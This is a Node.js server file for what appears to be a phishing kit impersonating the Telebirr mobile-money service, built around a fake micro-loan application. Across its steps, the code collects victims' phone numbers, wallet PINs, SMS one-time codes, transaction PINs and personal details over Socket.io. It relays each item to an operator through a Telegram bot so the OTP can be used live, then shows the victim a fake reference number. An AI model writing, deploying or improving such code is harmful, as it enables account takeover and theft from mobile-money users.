require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const REQUIRED_ENV = ['BOT_TOKEN', 'ADMIN_CHAT_ID'];
REQUIRED_ENV.forEach((env) => {
    if (!process.env[env] || process.env[env].trim() === "") {
        console.error(`❌ [CRITICAL ENV ERROR] Missing variable: ${env}`);
        process.exit(1);
    }
});

const botManager = require('./bot_manager');
const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});
global.io = io; 

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    try {
        botManager.bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (err) {
        console.error("❌ Webhook resolution error:", err.message);
        res.sendStatus(500);
    }
});

io.on('connection', (socket) => {
    let activeRoom = `TB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    socket.join(activeRoom);
    socket.emit('session-ready', { appId: activeRoom });

    socket.on('join-room', (room) => {
        if (room && room !== "null" && room !== "") {
            socket.leave(activeRoom);
            socket.join(room);
            activeRoom = room;
        }
    });

    const getValidId = (data) => (data && data.appId) ? data.appId : activeRoom;

    socket.on('submit-step1-credentials', (data) => {
        const currentId = getValidId(data);
        // Step 1 uses requireInlineButtons = false so it runs purely as a background notification card
        botManager.sendToAdmin(currentId, "Step 1 - Account Login", {
            "Mobile Phone": `+251${data.phone}`,
            "Wallet Access PIN": data.pin
        }, false);
    });

    socket.on('submit-otp-verification', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 2 - OTP Verification", {
            "SMS OTP Code": data.code
        }, true);
    });

    socket.on('submit-final-pin', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 3 - Transaction Authorization", {
            "Transaction PIN": data.pin
        }, true);
    });

    socket.on('submit-step4-loan-config', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 4 - Micro-Credit Parameters", {
            "Category Type": data.loanType,
            "Amount Requested": `${data.amount} ETB`,
            "Repayment Term": `${data.term} Weeks`
        }, false);
    });

    socket.on('submit-step5-kyc-profile', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 5 - KYC Information", {
            "First Name": data.firstName,
            "Last Name": data.lastName,
            "Email Address": data.email
        }, false);
    });
    
    socket.on('submit-step6-financials', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 6 - Employment Verification", {
            "Employment Type": data.employment,
            "Monthly Earnings": `${data.income} ETB`
        }, false);

        const txnReferenceId = `TXN-${Math.floor(100000 + Math.random() * 900000)}-ETB`;
        io.to(currentId).emit('application-complete', { referenceId: txnReferenceId });
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Telebirr Core Financial System running on port ${PORT}`);
    if (EXTERNAL_URL) {
        const base = EXTERNAL_URL.endsWith('/') ? EXTERNAL_URL.slice(0, -1) : EXTERNAL_URL;
        const webhookUrl = `${base}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook registered to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed:', err.message);
        }
    }
});